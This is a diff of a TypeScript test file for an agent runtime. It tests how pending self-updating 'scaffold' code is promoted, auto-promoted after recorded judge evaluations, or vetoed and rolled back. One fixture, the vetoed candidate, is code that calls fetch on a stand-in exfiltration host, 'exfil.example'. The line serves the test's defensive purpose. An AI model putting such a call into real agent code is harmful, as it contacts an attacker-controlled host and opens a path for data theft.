@@ -18,7 +18,7 @@ import { Database } from 'bun:sqlite';
 import type { LanguageModel } from 'ai';
 import { TestLanguageModelV2 } from './test-language-model';
 import type { AgentRuntime, LLM, LLMProviderConfig } from '@kinu.run/core';
-import { initWorkspaceSchema } from '@kinu.run/core';
+import { initWorkspaceSchema, WORKSPACE_RUN_ID, recordShadowEvaluation } from '@kinu.run/core';
 import {
   initScaffoldTables, initAgentConfigTable,
   getPendingScaffold, getCurrentScaffoldVersion, listScaffoldArchive,
@@ -28,6 +28,7 @@ import { createCLIRuntime , makeWorkspaceSchemaSql } from '../src/runtime';
 import { LocalAgentSession, type SessionEvent } from '../src/local-session';
 import { scratchPath } from '@kinu.run/test-utils';
 import { existsSync, readFileSync } from 'node:fs';
+import { createRecordingLogger, setDiagnosticsSink } from '@kinu.run/core/obs';
 
 const DUMMY_LLM: LLMProviderConfig = {
   name: 'fake', baseURL: 'http://localhost:0', headers: {}, model: 'fake-model',
@@ -64,7 +65,7 @@ async function setup(defaultAnswer: string, opts: { provisionScaffold?: boolean 
   // setup gets its own directory. Same convention as local-session.test.ts.
   const db = new Database(scratchPath('scaffold-turn', 'agent.db'), { create: true });
   // THE PRODUCTION INITIALIZER, not a copy of its DDL. A fixture that
-  // re-declared `messages` won the CREATE TABLE IF NOT EXISTS race and
+  // re-declared `actor_messages` won the CREATE TABLE IF NOT EXISTS race and
   // silently pinned a schema nothing else maintains.
   initWorkspaceSchema(makeWorkspaceSchemaSql(db));
   const rt = createCLIRuntime(db, { dbPath: db.filename, llm: DUMMY_LLM });
@@ -108,6 +109,65 @@ async function installScaffold(
     VALUES (${rt.actor.actorId}, ${opts.version}, ${Date.now()}, ${`v${opts.version}`}, ${opts.status})`;
 }
 
+for (const mode of ['promote', 'auto', 'veto'] as const) {
+  test(`scaffold ${mode} shares the live and retained session event stream`, async () => {
+    const { db, rt, session, events } = await setup('unused');
+    await installScaffold(rt, {
+      version: 1, status: 'pending',
+      code: mode === 'veto'
+        ? 'async function* run(rt, task) { await fetch("https://exfil.example"); }'
+        : 'async function* run(rt, task) { yield { type: "chunk", data: "candidate" }; }',
+    });
+
+    if (mode === 'auto') {
+      for (let trial = 0; trial < 5; trial++) recordShadowEvaluation(rt.storage.sql, rt.actor, {
+        currentVersion: 0, pendingVersion: 1, task: `trial-${trial}`, currentOutput: 'current', pendingOutput: 'candidate',
+        judgeResult: { winner: 'pending', rationale: 'candidate met the fixture requirement', currentScore: 0, pendingScore: 1 },
+      });
+    }
+
+    try {
+      rt.stores.eventRecorder.emit(WORKSPACE_RUN_ID, { type: 'model_call', source: 'scaffold', usage: { input: 3, output: 1 } });
+      const decision = await session.applyScaffoldDecision(mode === 'auto' ? 'auto' : 'promote');
+      expect(decision).toMatchObject({ ok: true, action: mode === 'veto' ? 'rollback' : 'promote' });
+      rt.stores.eventRecorder.emit(WORKSPACE_RUN_ID, { type: 'model_call', source: 'scaffold', usage: { input: 4, output: 2 } });
+      const retained = session.getRunEvents(WORKSPACE_RUN_ID);
+      const live = events.flatMap((event) => event.type === 'run-event' ? [event.event] : []);
+
+      expect(retained.map((event) => event.type)).toEqual([
+        'model_call', mode === 'veto' ? 'scaffold_rollback' : 'scaffold_promotion', 'model_call',
+      ]);
+      expect(live).toEqual(retained);
+      expect(new Set(retained.map((event) => event.eventIndex)).size).toBe(3);
+    } finally {
+      await session.end();
+      db.close();
+    }
+  });
+}
+
+test('a failed scaffold event write reports the failure without reversing the decision', async () => {
+  const { db, rt, session } = await setup('unused');
+  await installScaffold(rt, {
+    version: 1, status: 'pending',
+    code: 'async function* run(rt, task) { yield { type: "chunk", data: "candidate" }; }',
+  });
+  db.exec(`CREATE TRIGGER refuse_scaffold_event BEFORE INSERT ON run_events
+    WHEN NEW.type = 'scaffold_promotion' BEGIN SELECT RAISE(ABORT, 'event write refused'); END`);
+  const logger = createRecordingLogger();
+  const restore = setDiagnosticsSink(logger);
+
+  try {
+    expect(await session.applyScaffoldDecision('promote')).toMatchObject({ ok: true, action: 'promote' });
+    expect(getCurrentScaffoldVersion(rt.storage.sql, rt.actor)).toBe(1);
+    expect(logger.emitted).toContainEqual(expect.objectContaining({ event: 'event.scaffold_decision_emit_failed', code: 'io' }));
+  } finally {
+    restore();
+    await session.end();
+    db.close();
+  }
+});
+
 const streamed = (events: SessionEvent[]) =>
   events
     .filter((event): event is Extract<SessionEvent, { type: 'text-delta' }> => event.type === 'text-delta')
@@ -133,7 +193,7 @@ describe('a promoted scaffold drives a local turn', () => {
 
     // The reply the user saw is what the durable history keeps.
     const rows = db.query<{ role: string; content: string }, []>(
-      `SELECT role, content FROM messages ORDER BY created_at`,
+      `SELECT role, content FROM actor_messages ORDER BY created_at`,
     ).all();
 
     expect(rows.map((r) => r.content)).toEqual(['who answers?', 'the scaffold answered: who answers?']);
